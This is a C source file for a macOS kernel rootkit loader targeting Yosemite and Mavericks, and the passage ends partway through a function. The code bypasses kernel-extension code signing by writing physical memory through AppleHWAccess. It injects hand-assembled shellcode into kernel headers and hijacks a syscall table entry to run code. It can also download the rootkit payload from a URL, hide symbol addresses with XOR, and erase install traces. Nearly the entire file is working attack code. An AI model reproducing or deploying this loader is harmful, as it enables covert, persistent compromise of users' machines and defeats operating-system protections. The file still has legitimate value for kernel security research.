/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.     .----.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'    \_,-.  |
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.        .' .'
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'       .'  /_
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.     |      |
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'     `------'
 *
 * A kernel rootkit load based on AppleHWAccess kernel extension for Yosemite and Mavericks
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * This rootkit loader bypasses kernel extensions code signing requirement by leveraging
 * access to AppleHWAccess.kext, which allows to read/write computer physical memory.
 *
 * rootkit.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "rootkit.h"

#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <mach/processor_set.h>
#include <mach/mach_vm.h>
#include <sys/param.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>
#include <mach-o/x86_64/reloc.h>
#include <sys/sysctl.h>

#include "logging.h"
#include "structures.h"
#include "utils.h"
#include "kernel_symbols.h"
#include "remote.h"

unsigned char alloc_contiguous_shellcode[] =
"\x55" // push rbp (1) (0)
"\x48\x89\xE5" // mov rbp, rsp (3) (1)
"\x48\x81\xEC\x20\x00\x00\x00" // sub rsp, 0x20 (7) (4)
/*
 * allocate contiguous memory using kmem_alloc_contig
 */
"\x48\x8d\x3d\xFF\xFF\xFF\x01" // lea rdi, kernel_map - target_task (7) (11) FIX 1
"\x48\x8B\x3F" // mov rdi, [rdi] (3) (18) - map
"\x48\x89\x7D\xF0" // mov [rbp-0x10], rdi (4) (21) - store map in local var
"\x48\xC7\x45\xF8\x00\x00\x00\x00" // mov [rbp-8], 0 (8) (25)
"\x48\x8D\x75\xF8" // lea rsi, [rbp-8] (4) (33) - local var for address
"\x48\x31\xD2" // xor rdx, rdx (3) (37)
"\xBA\xFF\xFF\xFF\xFF" // mov edx, 0x8000 - size (5) (40) FIX 7
"\x48\x31\xC9" // xor rcx, rcx (3) (45)
"\xB9\xFF\x0F\x00\x00" // mov ecx, 0xFFF - mask (5) (48)
"\x4D\x31\xc0" // xor r8, r8 - max_pnum (3) (53)
"\x4D\x31\xC9" // xor r9, r9 - pnum_mask (3) (56)
"\xC7\x04\x24\x00\x00\x00\x00" // mov [rsp], 0x0 - flags (7) (59)
"\xE8\xFF\xFF\xFF\x02" // call kmem_alloc_contig(map, *address, size, mask, max_pnum, pnum_mask, flags) (5) (66) FIX 2
/*
 * store the allocated address in the first mod_init pointer 
 */
"\x48\x8d\x3d\xFF\xFF\xFF\x03" // lea rdi, mod_init_ptr - target_task (7) (71) FIX 3
"\x48\x8B\x75\xF8" // mov rsi, [rbp-8] (4) (78)
"\x48\x89\x37" // mov [rdi], rsi (3) (82)
/*
 * convert virtual address to physical 
 */
"\x48\x89\xF7" // mov rdi, rsi (3) (85)
"\xE8\xFF\xFF\xFF\x04" // call kvtophys (5) (88) FIX 4
/*
 * store fixed address in the second mod_init pointer 
 */
"\x48\x8D\x3D\xFF\xFF\xFF\x05" // lea rdi, mod_init_ptr+8 (7) (93) FIX 5
"\x48\x89\x07" // mov [rdi], rax (3) (100)
/*
 * change memory protection to executable 
 */
"\x48\x8B\x75\xF8" // mov rsi, [rbp-8] (4) (103)
"\xBA\xFF\xFF\xFF\xFF" // mov rdx, 0x8000 - size (5) (107) FIX 8
"\x48\x31\xC9" // xor rcx, rcx - set_max (3) (112)
"\x41\xB8\x07\x00\x00\x00" // mov r8, 0x7 - new_protection: VM_PROT_ALL (6) (115)
"\x48\x8B\x7D\xF0" // mov rdi, [rbp-0x10] (4) (121)
"\xE8\xFF\xFF\xFF\x06" // call mach_vm_protect(target_task, address, size, set_max, new_protection) (5) (125) FIX 6
/*
 * and finally return 
 */
"\x48\x83\xC4\x20" // add rsp, 0x20 (4) (130)
"\x5D" // pop rbp (1) (134)
"\xC3" // ret (1) (135)
; // total 136 bytes

#define SYSCALL_CLASS_SHIFT                     24
#define SYSCALL_CLASS_MASK                      (0xFF << SYSCALL_CLASS_SHIFT)
#define SYSCALL_NUMBER_MASK                     (~SYSCALL_CLASS_MASK)
#define SYSCALL_CLASS_UNIX                      2
#define SYSCALL_CONSTRUCT_UNIX(syscall_number) \
((SYSCALL_CLASS_UNIX << SYSCALL_CLASS_SHIFT) | \
(SYSCALL_NUMBER_MASK & (syscall_number)))

struct reloc_info
{
    struct dysymtab_command *dysymtab;
    struct symtab_command *symtab;
};

static char * find_symbol_by_nr(uint8_t *buffer, struct reloc_info *ri, int sym_number);
static uint32_t get_rootkit_mem_size(const uint8_t *buffer);
static kern_return_t copy_rootkit_to_kmem(mach_vm_address_t rootkit_addr, const uint8_t *buffer);
static kern_return_t fix_rootkit_relocations(uint8_t *rk_buffer, struct kernel_info *kinfo, struct rk_info *rk_info);
static mach_vm_address_t find_rootkit_entrypoint(uint8_t *buffer);
static kern_return_t map_local_rootkit(const char *filename, uint8_t **buffer, size_t *size);
static kern_return_t unmap_local_rootkit(uint8_t *buffer, size_t size);
static int install_alloc_contigmem_shellcode(struct kernel_info *kinfo, struct rk_info *rk_info);
static kern_return_t allocate_rootkit_mem(struct kernel_info *kinfo, struct rk_info *rk_info, mach_vm_address_t *out_phys, mach_vm_address_t *out_virt);

#pragma mark -
#pragma mark Exported functions

kern_return_t
install_rootkit(const char *rootkit_file,
                struct kernel_info *kinfo,
                struct rk_info *rk_info)
{
    OUTPUT_MSG("-----[ Installing rootkit into kernel memory ]-----");
    
    if (rootkit_file == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return KERN_FAILURE;
    }

    uint8_t *rootkit_buffer = NULL;
    size_t mapped_size = 0;
    int file_mapped = 0;
    
    if (strncmp(rootkit_file, "http://", 7) == 0 ||
        strncmp(rootkit_file, "https://", 8) == 0)
    {
        DEBUG_MSG("Retrieving rootkit payload from remote website...");
        if (download_remote_rootkit(&rootkit_buffer, rootkit_file) != 0)
        {
            ERROR_MSG("Failed to retrieve remote rootkit payload.");
            return KERN_FAILURE;
        }
    }
    else
    {
        DEBUG_MSG("Retrieving rootkit payload from local file...");
        if (map_local_rootkit(rootkit_file, &rootkit_buffer, &mapped_size) != KERN_SUCCESS)
        {
            ERROR_MSG("Failed to map local rootkit payload.");
            return KERN_FAILURE;
        }
        file_mapped = 1;
    }

    /* we need to find the total size of the rootkit in memory
     * and not the size on disk because of aligment space
     */
    uint32_t rootkit_size = get_rootkit_mem_size(rootkit_buffer);
    if (rootkit_size == 0)
    {
        ERROR_MSG("Failed to retrieve rootkit memory size.");
        goto failure;
    }
    DEBUG_MSG("Rootkit size in memory 0x%x", rootkit_size);
    rk_info->rootkit_size = rootkit_size;

    /* find if there's at least some free space */
    int64_t kernel_header_space = kinfo->text_section_fileoff - (kinfo->cmds_size + sizeof(struct mach_header_64));
    if (kernel_header_space < 0)
    {
        ERROR_MSG("No free space in kernel headers.");
        goto failure;
    }
    DEBUG_MSG("Kernel header space 0x%llx", kernel_header_space);
    
    /*
     * the kernel mach-o header space is used for the memory allocation
     * shellcode only
     * if there's enough space there to install the memory allocation shellcode
     * then we will always allocate new memory for the rootkit itself
     * this makes things easier and avoids issues with CR0 WP bit.
     *
     * if there's not enough space we can't proceed.
     * there are many other places with free space but not implemented in this code
     */
    if (kernel_header_space < sizeof(alloc_contiguous_shellcode))
    {
        /* we are toasted, need to find other places */
        /* XXX: TODO */
        ERROR_MSG("Not enough kernel header space to install allocate memory shellcode.");
        goto failure;
    }

    /* headers offset where we install the shellcode */
    uint64_t rootkit_phys_offset = kinfo->cmds_size + sizeof(struct mach_header_64);
    /* the corresponding physical address */
    rk_info->shellcode_phys_addr = rk_info->kernel_phys_addr + rootkit_phys_offset;
    /* the corresponding virtual address */
    rk_info->shellcode_virt_addr = kinfo->text_vmaddr + kinfo->kaslr_slide + rootkit_phys_offset;
    
    DEBUG_MSG("Free space physical address in kernel mach-o header: 0x%llx", rk_info->shellcode_phys_addr);
    DEBUG_MSG("Free space virtual address in kernel mach-o header: 0x%llx", rk_info->shellcode_virt_addr);

    /* allocate memory for the rootkit */
    mach_vm_address_t allocated_virt = 0;
    mach_vm_address_t allocated_phys = 0;
    allocate_rootkit_mem(kinfo, rk_info, &allocated_phys, &allocated_virt);
    /* set the rootkit locations to the new allocated addresses */
    DEBUG_MSG("Rootkit physical address in allocated memory: 0x%llx", allocated_phys);
    DEBUG_MSG("Rootkit virtual address in allocated memory: 0x%llx", allocated_virt);
    /* set the addresses for the rootkit code */
    rk_info->rk_phys_addr = allocated_phys;
    rk_info->rk_virt_addr = allocated_virt;

    /* now copy rootkit to kernel memory */
    if (copy_rootkit_to_kmem(rk_info->rk_phys_addr, rootkit_buffer) != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to copy rootkit to kernel memory.");
        goto failure;
    }

    /*  we need to fix relocations else we wil have ugly crashes */
    if (fix_rootkit_relocations(rootkit_buffer, kinfo, rk_info) != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to fix rootkit relocations!");
        goto failure;
    }

    /* find the rootkit entrypoint to add as syscall pointer */
    rk_info->rk_entrypoint = find_rootkit_entrypoint(rootkit_buffer);
    if  (rk_info->rk_entrypoint == 0)
    {
        ERROR_MSG("Failed to find rootkit entrypoint!");
        goto failure;
    }
    DEBUG_MSG("Rootkit original entrypoint at address 0x%llx", rk_info->rk_entrypoint);
    /* we need to add where the rootkit base addresss is located */
    rk_info->rk_entrypoint += rk_info->rk_virt_addr;
    DEBUG_MSG("Rootkit entrypoint at virtual address 0x%llx", rk_info->rk_entrypoint);

    /* change the syscall to point to rootkit entrypoint - the rootkit can be now started by executing the syscall */
    OUTPUT_MSG("-----[ Modifying sysent table ]-----");
    DEBUG_MSG("Sysent physical address 0x%llx", rk_info->sysent_phys_addr);
    writekmem(rk_info->sysent_phys_addr, 8, (void*)&rk_info->rk_entrypoint);
#if 0
    uint64_t verify_res = 0;
    readkmem(rk_info->sysent_phys_addr, 8, (void*)&verify_res);
    DEBUG_MSG("Modified sysent contents: 0x%llx", verify_res);
#endif
    
end:
    /* cleanup */
    if (file_mapped)
    {
        unmap_local_rootkit(rootkit_buffer, mapped_size);
    }
    return KERN_SUCCESS;
    
failure:
    if (file_mapped)
    {
        unmap_local_rootkit(rootkit_buffer, mapped_size);
    }
    return KERN_FAILURE;

}

static kern_return_t
allocate_rootkit_mem(struct kernel_info *kinfo,
                     struct rk_info *rk_info,
                     mach_vm_address_t *out_phys,
                     mach_vm_address_t *out_virt)
{
    /* physical address of the pointers */
    uint64_t ptr1_phys = (kinfo->modinit_addr + kinfo->kaslr_slide) & 0x00000000FFFFFFFF;
    uint64_t ptr2_phys = (kinfo->modinit_addr + kinfo->kaslr_slide + 8) & 0x00000000FFFFFFFF;
    
    /* retrieve original pointers in mod_init */
    mach_vm_address_t orig1 = 0;
    mach_vm_address_t orig2 = 0;
    readkmem(ptr1_phys, 8, &orig1);
    readkmem(ptr2_phys, 8, &orig2);

    /* install and run the initial shellcode */
    if (install_alloc_contigmem_shellcode(kinfo, rk_info) != 0)
    {
        ERROR_MSG("Failed to install shellcode!");
        return KERN_FAILURE;
    }

    OUTPUT_MSG("-----[ Executing allocate memory shellcode ]-----");
    writekmem(rk_info->sysent_phys_addr, 8, (void*)&rk_info->shellcode_virt_addr);
    if (start_kernel_code() != KERN_SUCCESS)
    {
        /* restore sysent pointer */
        mach_vm_address_t nosys = solve_kernel_symbol(kinfo, "_nosys");
        writekmem(rk_info->sysent_phys_addr, 8, (void*)&nosys);
        return KERN_FAILURE;
    }
    /* restore sysent pointer */
    mach_vm_address_t nosys = solve_kernel_symbol(kinfo, "_nosys");
    writekmem(rk_info->sysent_phys_addr, 8, (void*)&nosys);
    /* cleanup shellcode */
    zerokmem(rk_info->shellcode_phys_addr, sizeof(alloc_contiguous_shellcode));
    
    /* retrieve the allocated addresses from mod_init pointers */
    readkmem(ptr1_phys, 8, out_virt);
    readkmem(ptr2_phys, 8, out_phys);
    DEBUG_MSG("Allocated kernel memory at physical address 0x%llx, and virtual address 0x%llx", *out_phys, *out_virt);
    /* restore original mod_init pointers */
    writekmem(ptr1_phys, 8, (void*)&orig1);
    writekmem(ptr2_phys, 8, (void*)&orig2);

    return KERN_SUCCESS;
}

kern_return_t
start_kernel_code(void)
{
    OUTPUT_MSG("-----[ Starting code execution via syscall ]-----");
    uint64_t syscallnr = SYSCALL_CONSTRUCT_UNIX(8);
    
    int result = 0;
    __asm__ ("movq %1, %%rax\n\t"
             "syscall"
             : "=a" (result)
             : "a" (syscallnr)
             : "rax"
             );
    if (result == 0)
    {
        OUTPUT_MSG("-----[ Code execution successful ]-----");
        return KERN_SUCCESS;
    }
    else
    {
        ERROR_MSG("Code execution failed with error 0x%x.", result);
        return KERN_FAILURE;
    }
}

void
cleanup_rootkit_traces(struct rk_info *rk_info)
{
    OUTPUT_MSG("-----[ Cleaning up rootkit install footprints ]-----");
    mach_vm_address_t temp = 0;
    readkmem(rk_info->sysent_phys_addr, 8, (void*)&temp);
    if (temp == rk_info->rk_entrypoint)
    {
        DEBUG_MSG("Restoring enosys to hooked sysent table entry.");
        writekmem(rk_info->sysent_phys_addr, 8, (void*)&(rk_info->nosys_addr));
    }
}

#pragma mark -
#pragma mark Local functions

/*
 * this allows us to allocate contiguous physical memory
 * which makes it easier to write the rootkit payload
 * since we assume physical memory is contiguous (because that is true when we write to the header)
 */
static int
install_alloc_contigmem_shellcode(struct kernel_info *kinfo, struct rk_info *rk_info)
{
    /* we need the location of these symbols to compute the RIP relative offsets
     * all the values contain the KASLR slide
     */
    mach_vm_address_t _kmem_alloc_contig = solve_kernel_symbol(kinfo, "_kmem_alloc_contig");
    mach_vm_address_t _kvtophys = solve_kernel_symbol(kinfo, "_kvtophys");
    mach_vm_address_t _mach_vm_protect = solve_kernel_symbol(kinfo, "_mach_vm_protect");
    mach_vm_address_t _kernel_map = solve_kernel_symbol(kinfo, "_kernel_map");
    DEBUG_MSG("Kernel map at 0x%llx", _kernel_map);
    
    /* fix shellcode offsets */
    /* all the offsets are RIP relative
     * and "watermarked" with sequence FFFFFFXX */
    uint8_t *location = NULL;
    int32_t position = 0;
    size_t shellcode_size = sizeof(alloc_contiguous_shellcode) - 1;

    unsigned char *shellcode = calloc(1, sizeof(alloc_contiguous_shellcode));
    if (shellcode == NULL)
    {
        ERROR_MSG("Failed to allocate memory for shellcode copy.");
        return -1;
    }
    memcpy(shellcode, alloc_contiguous_shellcode, sizeof(alloc_contiguous_shellcode));

    /* call to _kmem_alloc_contig */
    uint8_t kmem_bytes[] = {0xE8, 0xFF, 0xFF, 0xFF, 0x02};
    location = memmem(shellcode, shellcode_size, kmem_bytes, sizeof(kmem_bytes));
    position = (int)(location - shellcode);
    uint32_t kmem_alloc_contig_offset = (uint32_t)(_kmem_alloc_contig - rk_info->shellcode_virt_addr - sizeof(kmem_bytes) - position);
    /* sizeof(pattern) - 4 gives us the position of the 32 bits offset we need to update */
    memcpy(shellcode + position + (sizeof(kmem_bytes)-4), &kmem_alloc_contig_offset, 4);

    /* call to kvtophys */
    uint8_t kvtophys_bytes[] = {0xE8, 0xFF, 0xFF, 0xFF,0x04};
    location = memmem(shellcode, shellcode_size, kvtophys_bytes, sizeof(kvtophys_bytes));
    position = (int)(location - shellcode);
    uint32_t kvtophys_offset = (uint32_t)(_kvtophys - rk_info->shellcode_virt_addr - sizeof(kvtophys_bytes) - position);
    memcpy(shellcode + position + (sizeof(kvtophys_bytes)-4), &kvtophys_offset, 4);

    /* call to mach_vm_protect */
    uint8_t machvmprotect_bytes[] = {0xE8, 0xFF, 0xFF, 0xFF, 0x06};
    location = memmem(shellcode, shellcode_size, machvmprotect_bytes, sizeof(machvmprotect_bytes));
    position = (int)(location - shellcode);
    uint32_t machvmprotect_offset = (uint32_t)(_mach_vm_protect - rk_info->shellcode_virt_addr - sizeof(machvmprotect_bytes) - position);
    memcpy(shellcode + position + (sizeof(machvmprotect_bytes)-4), &machvmprotect_offset, 4);

    /* kernel map global variable */
    uint8_t kernelmap_bytes[] = {0x48, 0x8d, 0x3d, 0xFF, 0xFF, 0xFF, 0x01};
    location = memmem(shellcode, shellcode_size, kernelmap_bytes, sizeof(kernelmap_bytes));
    position = (int)(location - shellcode);
    uint32_t kernelmap_offset = (uint32_t)(_kernel_map - rk_info->shellcode_virt_addr - sizeof(kernelmap_bytes) - position);
    memcpy(shellcode + position + (sizeof(kernelmap_bytes)-4), &kernelmap_offset, 4);

    /* modinit_ptr - where we store virtual allocated address */
    uint8_t modinitptr_bytes[] = {0x48, 0x8d, 0x3d, 0xFF, 0xFF, 0xFF, 0x03};
    location = memmem(shellcode, shellcode_size, modinitptr_bytes, sizeof(modinitptr_bytes));
    position = (int)(location - shellcode);
    uint32_t mod_init_ptr_offset = (uint32_t)(kinfo->modinit_addr + kinfo->kaslr_slide - rk_info->shellcode_virt_addr - sizeof(modinitptr_bytes) - position);
    memcpy(shellcode + position + (sizeof(modinitptr_bytes)-4), &mod_init_ptr_offset, 4);
    /* modinit_ptr+8 - where we store physical allocated address */
    uint8_t modinitptr2_bytes[] = {0x48, 0x8D, 0x3D, 0xFF, 0xFF, 0xFF, 0x05};
    location = memmem(shellcode, shellcode_size, modinitptr2_bytes, sizeof(modinitptr2_bytes));
    position = (int)(location - shellcode);
    uint32_t mod_init_ptr2_offset = (uint32_t)(kinfo->modinit_addr + 8 + kinfo->kaslr_slide - rk_info->shellcode_virt_addr - sizeof(modinitptr2_bytes) - position);
    memcpy(shellcode + position + (sizeof(modinitptr2_bytes)-4), &mod_init_ptr2_offset, 4);
    
    /* fix allocation size - there are two instances we need to fix */
    uint8_t size_bytes[] = {0xBA, 0xFF, 0xFF, 0xFF, 0xFF};
    location = memmem(shellcode, shellcode_size, size_bytes, sizeof(size_bytes));
    position = (int)(location - shellcode);
    memcpy(shellcode + position + (sizeof(size_bytes) - 4), &rk_info->rootkit_size, 4);
    /* find next */
    location = memmem(shellcode + position + 1, shellcode_size, size_bytes, sizeof(size_bytes));
    position = (int)(location - shellcode);
    memcpy(shellcode + position + (sizeof(size_bytes) - 4), &rk_info->rootkit_size, 4);
    
    /* finally write shellcode to kernel memory */
    writekmem(rk_info->shellcode_phys_addr, shellcode_size, (void*)shellcode);
    free(shellcode);
    /* it will be executed when syscall is modified and called */
    return 0;
}

static kern_return_t
map_local_rootkit(const char *filename, uint8_t **buffer, size_t *size)
{
    int fd = -1;
    
    fd = open(filename, O_RDONLY);
    if (fd < 0)
    {
        ERROR_MSG("Failed to open rootkit file: %s.", strerror(errno));
        return KERN_FAILURE;
    }
    
    struct stat statbuf = {0};
    if ( fstat(fd, &statbuf) < 0 )
    {
        ERROR_MSG("Can't fstat file: %s", strerror(errno));
        close(fd);
        return KERN_FAILURE;
    }
    
    if ( (*buffer = mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
        ERROR_MSG("Mmap failed on file: %s", strerror(errno));
        close(fd);
        return KERN_FAILURE;
    }
    close(fd);
    return KERN_SUCCESS;
}

static kern_return_t
unmap_local_rootkit(uint8_t *buffer, size_t size)
{
    if (buffer)
    {
        munmap(buffer, size);
    }
    return KERN_SUCCESS;
}

/* process and fix rootkit relocations
 * we can do this directly on the rootkit buffer instead of at target kernel memory
 * it's easier this way
 */
static kern_return_t
fix_rootkit_relocations(uint8_t *rk_buffer, struct kernel_info *kinfo, struct rk_info *rk_info)
{
    OUTPUT_MSG("-----[ Fixing rootkit symbols using relocation tables ]-----");
    
    if (rk_buffer == NULL || kinfo == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return KERN_FAILURE;
    }
    
    struct mach_header_64 *mh = (struct mach_header_64*)rk_buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return KERN_FAILURE;
    }
    
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        ERROR_MSG("Invalid number of commands or size.");
        return KERN_FAILURE;
    }
    
    /* process rootkit header to find location of necessary info */
    struct load_command *lc = (struct load_command*)(rk_buffer + sizeof(struct mach_header_64));
    
    struct reloc_info rk_header_info = {0};
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        if (lc->cmd == LC_DYSYMTAB)
        {
            struct dysymtab_command *cmd = (struct dysymtab_command*)lc;
            rk_header_info.dysymtab = cmd;
        }
        else if (lc->cmd == LC_SYMTAB)
        {
            struct symtab_command *cmd = (struct symtab_command*)lc;
            rk_header_info.symtab = cmd;
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    /* make sure we have valid information */
    if (rk_header_info.dysymtab == NULL ||
        rk_header_info.symtab == NULL)
    {
        ERROR_MSG("No rootkit symbols info available.");
        return KERN_FAILURE;
    }
    
    /* now process external relocations table and fix the symbols in kernel memory */
    /* nextrel is the number of external relocations we need to fix */
    /* we only fix the relocations of type X86_64_RELOC_BRANCH */
    /* they refer to "a CALL/JMP instruction with 32-bit displacement" */
    /* check mach-o/x86_64/reloc.h */
    DEBUG_MSG("Number of external relocation entries found in rootkit: %d", rk_header_info.dysymtab->nextrel);
    
    /* lame shellcode to jump to symbol address avoiding int32 offset issues */
    /* uses a simple xor obfuscation to hide the target symbol */
    /* XXX: can be vastly improved ;-) */
    uint8_t shellcode[] =
    "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"  // mov rax, 0x0
    "\x48\xBB\x00\x00\x00\x00\x00\x00\x00\x00"  // mov rbx, key
    "\x48\x31\xD8"                              // xor rax, rbx
    "\xFF\xE0";                                 // jmp rax
    
    size_t shellcode_size = sizeof(shellcode) - 1;
    /* allocate an island where we write the shellcode for each symbol */
    size_t island_size = mach_vm_round_page(shellcode_size * rk_header_info.dysymtab->nextrel);
    DEBUG_MSG("Relocations Island size is 0x%lx", island_size);
    
    mach_vm_address_t island_virt = 0;
    uint64_t island_phys = 0;
    DEBUG_MSG("Allocating kernel memory for island...");
    allocate_rootkit_mem(kinfo, rk_info, &island_phys, &island_virt);

    for (uint32_t i = 0; i < rk_header_info.dysymtab->nextrel; i++)
    {
        /* this structure contains the information for each relocation */
        struct relocation_info *rel = (struct relocation_info*)(rk_buffer + rk_header_info.dysymtab->extreloff + i * sizeof(struct relocation_info));
        
        /* find the name of the current symbol in relocation table */
        char *symbol = find_symbol_by_nr(rk_buffer, &rk_header_info, rel->r_symbolnum);
        if (symbol == NULL)
        {
            continue;
        }
        //        DEBUG_MSG("Symbol name: %s Original rootkit address:0x%x Extern:%x Length:%x PCRelative:%x Symbol nr:%d Type:%x", symbol, rel->r_address, rel->r_extern, rel->r_length, rel->r_pcrel, rel->r_symbolnum, rel->r_type);
        
        /* r_length: 0=byte, 1=word, 2=long, 3=quad */
        mach_msg_type_number_t write_size = 1 << rel->r_length;
        /* find the symbol address in kernel */
        /* this is the address we are going to fix to in the rootkit */
        mach_vm_address_t sym_addr = solve_kernel_symbol(kinfo, symbol);
//        DEBUG_MSG("Kernel symbol %s is located at 0x%llx", symbol, sym_addr);
//        DEBUG_MSG("Relocation offset address 0x%llx", rk_info->rk_virt_addr + rel->r_address);
        
        /* the only two types that are used are X86_64_RELOC_BRANCH and X86_64_RELOC_UNSIGNED */
        /* this info was gathered by processing all system kexts */
        
        /* XXX: fix the cases where there is a 4 bytes addend */
        /* doesn't seem to apply to kernel extensions? */
        if (rel->r_type == X86_64_RELOC_BRANCH)
        {
            /* compute the offset from the rootkit to the kernel symbol */
            /* this is because we should have a RIP offset addressing */
            uint64_t base_address = rk_info->rk_virt_addr + rel->r_address + write_size;
            int64_t offset2 = (int64_t)(island_virt - base_address);
            if (offset2 > INT32_MAX ||
                offset2 < INT32_MIN)
            {
                DEBUG_MSG("Offset is %llx", offset2);
                ERROR_MSG("Offset to island for symbol %s doesn't fit in signed integer!", symbol);
                return KERN_FAILURE;
            }
            int32_t offset = (int32_t)offset2;
            
            /* r_address points to the offset portion of the CALL instruction so it's always 1 byte ahead of the start of instruction address */
            /* this fixes the relocation offset into the rootkit instruction */
            kern_return_t kr = writekmem(rk_info->rk_phys_addr + rel->r_address, write_size, (void*)&offset);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write new X86_64_RELOC_BRANCH relocation for symbol %s", symbol);
                return KERN_FAILURE;
            }
            /* generate a 64 bits xor key for each relocation entry */
            uint64_t xor_key = (uint64_t)(arc4random() % ((unsigned)RAND_MAX + 1)) << 32 | (arc4random() % ((unsigned)RAND_MAX + 1));
            /* obfuscate the symbol address */
            mach_vm_address_t xored_sym_addr = sym_addr ^ xor_key;
            /* fix the shellcode, first with the obfuscated symbol address, next with the key */
            memcpy(shellcode + 2, &xored_sym_addr, sizeof(uint64_t));
            memcpy(shellcode + 12, &xor_key, sizeof(uint64_t));
            kr = writekmem(island_phys, shellcode_size, (void*)shellcode);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write relocation island entry for %s.", symbol);
                return KERN_FAILURE;
            }
            /* advance in island, we must advance both because one is used for writes the other to compute offsets */
            island_phys += shellcode_size;
            island_virt += shellcode_size;
        }
        /* these are absolute addresses so we just need to write the new address */
        else if (rel->r_type == X86_64_RELOC_UNSIGNED)
        {
            kern_return_t kr = writekmem(rk_info->rk_phys_addr + rel->r_address, write_size, (void*)&sym_addr);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write new X86_64_RELOC_UNSIGNED relocation for symbol %s", symbol);
            }
        }
    }
    
    /* we also need to fix local relocations, used for strings and some other symbols */
    DEBUG_MSG("Number of local relocation entries found in rootkit: %d", rk_header_info.dysymtab->nlocrel);
    /* process local relocations */
    /* these are easier because they are all of type X86_64_RELOC_UNSIGNED aka absolute */
    /* we don't even care about what symbols they belong to */
    /* the only thing that needs to be fixed is to add the virtual base address of the rootkit */
    for (uint32_t i = 0; i < rk_header_info.dysymtab->nlocrel; i++)
    {
        /* this structure contains the information for each relocation */
        struct relocation_info *rel = (struct relocation_info*)(rk_buffer + rk_header_info.dysymtab->locreloff + i * sizeof(struct relocation_info));
        /* guarantee we just process these */
        if (rel->r_extern == 0 && rel->r_pcrel == 0 && rel->r_type == X86_64_RELOC_UNSIGNED)
        {
            /* we need to read the original value and rebase it with rootkit load address */
            mach_vm_address_t target_addr = rk_info->rk_virt_addr + *(mach_vm_address_t*)(rk_buffer + rel->r_address);
//            DEBUG_MSG("Fixing local relocation #%d to address 0x%llx", i, target_addr);
            /* and then rewrite the value to the fixed absolute address */
            kern_return_t kr = writekmem(rk_info->rk_phys_addr + rel->r_address, 8, &target_addr);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write new X86_64_RELOC_UNSIGNED local relocation #%d", i);
                return KERN_FAILURE;
            }
